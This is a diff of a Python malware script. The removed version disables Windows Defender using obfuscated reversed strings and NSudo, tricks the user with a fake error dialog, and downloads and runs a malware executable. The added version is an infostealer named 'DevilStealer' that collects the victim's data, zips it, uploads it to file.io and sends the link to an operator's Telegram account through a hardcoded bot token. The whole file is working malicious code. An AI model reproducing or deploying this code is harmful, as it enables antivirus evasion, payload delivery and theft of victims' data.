@@ -1,94 +1,43 @@
-from fileinput import filename
-import requests
-import subprocess
-import ctypes
 import os
-import psutil
-import sys
-from time import sleep
-class DefeatDefender:
-    def __init__(self):
-        self.url = "exe.oduSN/niam/sdaeh/sfer/war/yar/xu-47sisukdi/moc.buhtig//:sptth"[::-1]
-        self.dll_handle = ctypes.WinDLL("User32.dll")
-        self.k_handle = ctypes.WinDLL("Kernel32.dll")
-        self.service = None
-        self.isrunning = False
+import telebot
+import requests
+import stealer
+from telebot import types
+import string
+import random
 
-        # Setting Up The Params
-        #global hWnd,lpText,lpCaption,uType
-        self.hWnd = None
-        self.lpCaption = 'Error Occured'
-        self.lpText = 'Windows Defender has blocked some of our Features.Please Turn off Windows Defender and run again'
-        self.uType = 0x00000010
-        
-    
+ADMIN_ID = "8247817782 " # Your telegram id
+FILE_IO_API_URL = "https://file.io"
 
-    def check(self):
-         global response
-         response = self.dll_handle.MessageBoxW(self.hWnd, self.lpText, self.lpCaption, self.uType)
-         
-        # Check For Errors 
-         error = self.k_handle.GetLastError()
-         if error != 0:
-            print("Error Code: {0}".format(error))
-            exit(1)
-    def checkservice(self):
-        
-        try:
-            sleep(2.5)
-            service = psutil.win_service_get('WdNisSvc')
-            service = service.as_dict()
-            for i in service:
-                if(service[i]=='running'):
-                    print("Please Turn off your Windows Defender")
-                    self.isrunning = True
-                else:
-                    pass            
-        except Exception as ex:
-            # raise psutil.NoSuchProcess if no service with such name exists
-            print(str(ex))
-    def shutservice(self):
-       
-        uname = os.getlogin() 
-        Path = f"C:\\Users\\{uname}\\AppData\\Local\\Temp"
-        
-        os.chdir(Path)
-        nsudo = requests.get(self.url,allow_redirects=True)
-        open('Nsudo.exe','wb').write(nsudo.content)
-        sleep(5)
-        Fullpath = Path +"\\Nsudo.exe"
-        print(Fullpath)
-        if(os.path.exists(Fullpath)):
-              malix = "dnefedniw  eteled cs  ediH:edoMwodniWwohS- T:U- odusN"[::-1]
-              subprocess.Popen(malix,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-              sleep(3.2)
-              malname = "youfilename.exe" # your filename must include .exe in the end
-              malwareurl = "https://your-url-here/" #change this
-              print(malwareurl)
-              malware = requests.get(malwareurl, allow_redirects=True)
+bot = telebot.TeleBot("8483072138:AAFGVSS5lNZJUr6dZYF1oPFeGHTfaSXwfmQ")
 
-              open(malname, 'wb').write(malware.content)
-              subprocess.Popen(malname,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
-              
-        
-        else:
-             print("file not present")     
-             sys.exit(0)
-    
+rand_title = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
+os.system(f"title {rand_title}")
+
+def upload_to_fileio(archive_path):
+    with open(archive_path, "rb") as file:
+        response = requests.post(FILE_IO_API_URL, files={"file": file})
+        response_data = response.json()
+        file.close()
+        return response_data.get("link")
+
+def send_to_tg(archive_path):
+    file_io_link = upload_to_fileio(archive_path)
+    lnkkb = types.InlineKeyboardMarkup()
+    btn = types.InlineKeyboardButton(text="😈 Скачать логи", url=file_io_link)
+    lnkkb.add(btn)
+    bot.send_message(ADMIN_ID, "DevilStealer>>> да", reply_markup=lnkkb)
+
+
+def main():
+    stealer.steal_all()
+    arch = stealer.create_zip_archive()
+    if arch:
+        send_to_tg(stealer.ZIP_PATH)
+        stealer.delFolder()
+        bot.stop_polling()
+        exit(0)
+
 if __name__ == "__main__":
-    ddf = DefeatDefender()
-    ddf.checkservice()
-    
-    if(ddf.isrunning==True):
-        while True:
-        
-            ddf.check()
-            if response == 1:
-             print("Clicked OK!")
-            
-            sys.exit(0)
-            break  
-    else:
-        print("Defender is already turned off") 
-        ddf.shutservice()
-        
+    main()
+    bot.polling(none_stop=True)
